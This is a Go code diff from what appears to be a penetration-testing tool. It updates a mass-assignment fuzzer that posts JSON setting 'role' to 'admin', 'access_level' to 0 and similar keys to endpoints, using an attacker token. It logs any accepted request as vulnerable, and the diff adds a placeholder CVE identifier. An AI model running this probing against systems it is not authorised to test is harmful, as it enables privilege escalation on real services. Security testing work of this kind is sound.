@@ -9,14 +9,12 @@ import (
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
-	"github.com/pterm/pterm"
 )
 
-// BOPLAContext defines the target and the base payload to fuzz
 type BOPLAContext struct {
 	TargetURL string
-	Method    string 
-	BaseJSON  string 
+	Method    string
+	BaseJSON  string
 }
 
 var administrativeKeys = []string{
@@ -26,7 +24,8 @@ var administrativeKeys = []string{
 }
 
 func ExecuteMassBOPLA(concurrency int) {
-	pterm.DefaultSection.Println("Phase 9.8: Industrialized BOPLA Engine")
+	// FIX: Removed pterm
+	utils.TacticalLog("[cyan::b]PHASE 9.8: Industrialized BOPLA Engine Started[-:-:-]")
 
 	GlobalDiscovery.mu.RLock()
 	var targets []string
@@ -45,18 +44,19 @@ func ExecuteMassBOPLA(concurrency int) {
 	GlobalDiscovery.mu.RUnlock()
 
 	if len(targets) == 0 {
-		utils.TacticalLog("No BOPLA-prone mutation endpoints detected.")
+		utils.TacticalLog("[yellow]No BOPLA-prone mutation endpoints detected.[-]")
 		return
 	}
 
 	for _, path := range targets {
 		ctx := &BOPLAContext{
 			TargetURL: CurrentSession.TargetURL + path,
-			Method:    "POST", 
+			Method:    "POST",
 			BaseJSON:  "{}",
 		}
 		ctx.RunFuzzer(concurrency)
 	}
+	utils.TacticalLog("[green::b]BOPLA Engine Execution Completed.[-:-:-]")
 }
 
 func (b *BOPLAContext) RunFuzzer(concurrency int) {
@@ -83,11 +83,11 @@ func (b *BOPLAContext) RunFuzzer(concurrency int) {
 func (b *BOPLAContext) ProbeProperty(key string) {
 	payloadMap := make(map[string]interface{})
 	_ = json.Unmarshal([]byte(b.BaseJSON), &payloadMap)
-	
+
 	if key == "role" || key == "account_type" {
 		payloadMap[key] = "admin"
 	} else if key == "group_id" || key == "access_level" {
-		payloadMap[key] = 0 
+		payloadMap[key] = 0
 	} else {
 		payloadMap[key] = true
 	}
@@ -97,7 +97,7 @@ func (b *BOPLAContext) ProbeProperty(key string) {
 	req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.10 Industrialized)")
-	
+
 	activeToken := CurrentSession.AttackerToken
 	if activeToken != "" {
 		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
@@ -110,15 +110,16 @@ func (b *BOPLAContext) ProbeProperty(key string) {
 	defer resp.Body.Close()
 
 	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusCreated {
-		// PATCHED: Unified Logging with Phase 9.13 Tags
 		utils.RecordFinding(db.Finding{
-			Phase:    "PHASE IV: INJECTION",
-			Target:   b.TargetURL,
-			Details:  fmt.Sprintf("BOPLA Property Injection Success: '%s' accepted", key),
-			Status:   "VULNERABLE",
-			OWASP_ID: "API3:2023",
-			MITRE_ID: "T1538", // Cloud Service Dashboard / Property manipulation
-			NIST_Tag: "PR.AC", // Identity Management, Auth and Access Control
+			Phase:      "PHASE IV: INJECTION",
+			Target:     b.TargetURL,
+			Details:    fmt.Sprintf("BOPLA Property Injection Success: '%s' accepted", key),
+			Status:     "VULNERABLE",
+			OWASP_ID:   "API3:2023",
+			MITRE_ID:   "T1538",
+			NIST_Tag:   "PR.AC",
+			CVE_ID:     "CVE-202X-MASS-ASSIGN",
+			CVSS_Score: "6.5", // CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
 		})
 	}
 }
